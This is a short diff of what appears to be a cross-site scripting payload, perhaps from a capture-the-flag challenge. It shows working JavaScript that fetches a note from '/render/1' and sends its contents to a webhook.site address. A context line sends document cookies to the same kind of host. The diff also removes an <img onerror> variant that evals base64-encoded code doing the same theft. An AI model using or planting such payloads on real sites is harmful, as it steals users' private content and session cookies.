@@ -4,15 +4,13 @@ fetch("https://webhook.site/74225546-4369-4a51-a43a-984ee6fa2bca/" + document.co
 
 
 
-
-
+<script>
 fetch('/render/1')
 .then(response => response.text())
 .then(note_content => {
-    fetch('https://webhook.site/74225546-4369-4a51-a43a-984ee6fa2bca/' + note_content);
+    fetch('https://webhook.site/dcaa8f21-3331-4dac-8ebd-127e00708d67/' + note_content);
 });
-
-<img src="https://www.markdownguide.org/asets/images/tux.png" onerror="eval(atob('ZmV0Y2goJy9yZW5kZXIvMScpCiAgICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgICAudGhlbihub3RlX2NvbnRlbnQgPT4gewogICAgICBmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvNzQyMjU1NDYtNDM2OS00YTUxLWE0M2EtOTg0ZWU2ZmEyYmNhLycgKyBub3RlX2NvbnRlbnQpOwogICAgfSk7Cg=='))">
+</script> 
 
 
 
